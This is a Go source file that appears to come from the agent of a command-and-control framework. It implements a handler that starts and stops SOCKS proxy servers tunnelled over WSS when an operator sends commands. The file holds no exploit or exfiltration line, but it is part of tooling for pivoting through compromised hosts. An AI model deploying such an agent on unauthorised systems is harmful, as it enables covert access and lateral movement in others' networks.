// internal/agent/handlers/socks_handler.go
package handlers

import (
	"c2/internal/agent/socks"
	"encoding/json"
	"fmt"
	"log"
	"sync"
)

type SocksManager struct {
	mu      sync.RWMutex
	servers map[string]*socks.Server
}

func NewSocksManager() *SocksManager {
	return &SocksManager{
		servers: make(map[string]*socks.Server),
	}
}

func (sm *SocksManager) HandleSocksCommand(command string, data string) (string, error) {
	// Parse the data field which contains our configuration
	var socksData struct {
		Action      string `json:"action"`
		SocksPort   int    `json:"socks_port"`
		WSSPort     int    `json:"wss_port"`
		WSSHost     string `json:"wss_host"`
		Path        string `json:"path"`
		Credentials struct {
			Username string `json:"username"`
			Password string `json:"password"`
			SSHKey   string `json:"ssh_key"`
		} `json:"credentials"`
	}

	if err := json.Unmarshal([]byte(data), &socksData); err != nil {
		return "", fmt.Errorf("failed to parse SOCKS data: %v", err)
	}

	sm.mu.Lock()
	defer sm.mu.Unlock()

	serverKey := fmt.Sprintf("%d", socksData.SocksPort)

	switch socksData.Action {
	case "start":
		if _, exists := sm.servers[serverKey]; exists {
			return "SOCKS server already running on port", nil
		}

		// Use the provided credentials
		creds := &socks.Credentials{
			Username: socksData.Credentials.Username,
			Password: socksData.Credentials.Password,
			SSHKey:   []byte(socksData.Credentials.SSHKey),
		}

		// Create and start the server
		server, err := socks.NewServer(socksData.SocksPort, socksData.Path, creds)
		if err != nil {
			return "", fmt.Errorf("failed to create SOCKS server: %v", err)
		}

		// Create and start the bridge
		bridge := socks.NewBridge(server)
		if err := bridge.Start(); err != nil {
			return "", fmt.Errorf("failed to start SOCKS bridge: %v", err)
		}

		if err := server.Start(); err != nil {
			bridge.Stop()
			return "", fmt.Errorf("failed to start SOCKS server: %v", err)
		}

		sm.servers[serverKey] = server
		log.Printf("Started SOCKS server on port %d and WSS server on port %d (path: %s)",
			socksData.SocksPort, socksData.WSSPort, socksData.Path)

		response := map[string]interface{}{
			"status":   "success",
			"port":     socksData.SocksPort,
			"wss_port": socksData.WSSPort,
			"wss_host": socksData.WSSHost,
			"path":     socksData.Path,
		}

		respJSON, err := json.Marshal(response)
		if err != nil {
			return "", fmt.Errorf("failed to marshal response: %v", err)
		}

		return string(respJSON), nil

	case "stop":
		server, exists := sm.servers[serverKey]
		if !exists {
			return "No SOCKS server running on specified port", nil
		}

		if err := server.Stop(); err != nil {
			return "", fmt.Errorf("failed to stop SOCKS server: %v", err)
		}

		delete(sm.servers, serverKey)
		return fmt.Sprintf("SOCKS server on port %d stopped", socksData.SocksPort), nil

	default:
		return "", fmt.Errorf("unknown SOCKS action: %s", socksData.Action)
	}
}

func (sm *SocksManager) Shutdown() {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	for _, server := range sm.servers {
		server.Stop()
	}
}
